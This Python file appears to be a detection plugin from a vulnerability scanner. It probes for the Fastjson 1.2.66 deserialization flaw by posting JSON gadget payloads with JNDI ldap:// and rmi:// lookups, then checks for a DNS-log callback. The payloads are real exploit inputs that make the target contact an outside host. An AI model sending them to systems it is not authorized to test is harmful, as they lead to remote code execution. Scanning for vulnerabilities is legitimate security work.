#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

rce_1_2_66_payloads = [
    {'data': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://DNSDOMAIN/cmai"}'},
    {'data': '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://DNSDOMAIN/zosk"}'},
    {'data': '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://DNSDOMAIN/pzoq"}'},
    {'data': '{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://DNSDOMAIN/mzli"}}'},
    {'data': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"rmi://DNSDOMAIN/qpak"}'},
    {'data': '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"rmi://DNSDOMAIN/sixu"}'},
    {'data': '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"rmi://DNSDOMAIN/ajfi"}'},
    {'data': '{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"rmi://DNSDOMAIN/zlfi"}}'},
]

def rce_1_2_66_scan(clients):
    '''  '''
    client = clients.get('reqClient')
    sessid = 'ff79d39d7f4ed0b1569765c84fddb401'
    
    vul_info = {
        'app_name': 'Fastjson',
        'vul_type': 'unSerialize',
        'vul_id': 'fastjson-1.2.66_rce',
    }
    
    headers = {
        'Content-Type': 'application/json'
    }

    for payload in rce_1_2_66_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
        
        data = payload['data'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'post',
            '',
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)
        if (dns.result(md, sessid)):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
